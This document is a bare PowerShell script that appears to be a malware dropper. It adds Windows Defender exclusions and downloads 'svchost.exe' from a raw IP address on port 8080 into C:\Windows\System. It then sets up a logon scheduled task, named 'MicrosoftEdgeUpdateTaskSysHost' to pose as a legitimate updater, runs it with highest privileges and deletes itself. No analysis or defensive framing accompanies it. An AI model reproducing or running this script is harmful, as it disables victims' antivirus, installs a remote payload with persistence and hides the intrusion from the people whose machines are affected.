$LinkExe = "http://104.248.91.138:8080/svchost.exe"
$ExeFile = "C:\Windows\System\svchost.exe"
$Ps1StartFile = "~\AppData\Roaming\Microsoft\Crypto\start.ps1"
$Exclusion1 = "C:\Windows\System"
$Exclusion2 = "C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\config\"
$Exclusion3 = "\\localhost\C$\Windows\System\"

#Add Defender Exclusion
Add-MpPreference -ExclusionPath $Exclusion1, $Exclusion2, $Exclusion3

#Copy files
wget -URI $LinkExe -outfile $ExeFile

#New task
$Trigger= New-ScheduledTaskTrigger –AtLogon
$User= $env:UserName
$Action= New-ScheduledTaskAction -Execute $ExeFile
Register-ScheduledTask -TaskName "MicrosoftEdgeUpdateTaskSysHost" -Trigger $Trigger -User $User -Action $Action -RunLevel Highest –Force
#Run Task
Start-ScheduledTask MicrosoftEdgeUpdateTaskSysHost
#Start-Process -FilePath $ExeFile

#Remove this script
Remove-Item –path $Ps1StartFile –recurse -Force
